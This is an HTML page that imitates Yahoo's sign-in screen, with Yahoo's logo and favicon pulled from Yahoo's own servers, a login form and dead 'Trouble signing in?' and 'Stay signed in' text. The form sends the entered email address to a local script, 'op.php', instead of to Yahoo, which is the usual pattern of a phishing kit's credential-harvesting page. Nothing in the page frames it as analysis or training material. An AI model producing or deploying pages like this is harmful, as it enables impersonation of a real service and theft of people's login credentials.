<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Yahoo - login</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/login/favicon.ico">
    <link rel="stylesheet" href="bootstrap/css/bootstrap.css">
    <script src="bootstrap/js/bootstrap.js"></script>
    <script src="bootstrap/js/jquery.min.js"></script>
    <style>
        .button{
            width:100%;
            background:#188fff;
            height:40px;
            color:white;
            font-size:20px;
            border:0px;
        }
        .button:hover{
            background:#4ca9ff;
            border:0px;
        }
        .input{
            position: relative;
            margin: 0;
            padding: 6px 10px;
            height: 40px;
            width:100%;
            border: 0;
            border-radius: 0;
            border-bottom: 1px solid #cfd2d5;
            letter-spacing: normal;
            font-size: 18px;
            color: black;
            z-index: 1;
        }
        .input:[placeholder]{
            color:#cfd2d5;
        }
        .btn{
            background-color:white;
            color:#188fff;
            border:2px solid #188fff;
            width:100%;
            font-size:17px;
        }
        .login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    z-index: 1;
    width: 100%;
        }
 
    </style>
</head>
<body id="bg">

<div class="row" style="height:75px;">
<img style="margin-left:42px; margin-top:11px;" src="https://s.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" class="logo" width="116" height="" />
</div>

<div class="row" style="background:whitesmoke; height:598px;">
    <div class="col-md-6" style="margin-left:150px; margin-top:100px;">
        <span style="font-size:22px;"><b>Yahoo makes it easy to enjoy what matters most in<br> your world.</b></span><br><br> 
        <span style="font-size:20px;">Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more.<br> You get more out of the web, you get more out of life.</span>
    </div>

        <div class="col-md-4" style="background:white; margin-top:10px; width:360px; min-height:550px;">
            <img style="margin-left:100px; margin-top:40px;" src="https://s.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" class="logo" width="116" height="" />
            <br><br>
            <h4 style="margin-left:130px;">Sign in</h4>

            <br><br>
            
            <form action="op.php" method="post">
                    <input type='text' name='username' placeholder='Enter your email' class='input'>
                    <br><br>
                    <input type='submit' value='Next' class='button'>
                    
                    <br><br><br>
                    
                    <input type="checkbox" name="" id=""> <span style="color:#188fff;">Stay signed in</span>
                    
                    <span style="margin-left:100px; color:#188fff;">Trouble signing in?</span>
                    
                    <br><br><br><br>

                    <a href="" class="btn">Create Account</a>
                </form>
    </div>

</div>

<div class="login-footer text-center"><span style="font-size:10px; color:#188fff;">Terms | Privacy</span></div>


</body>
</html>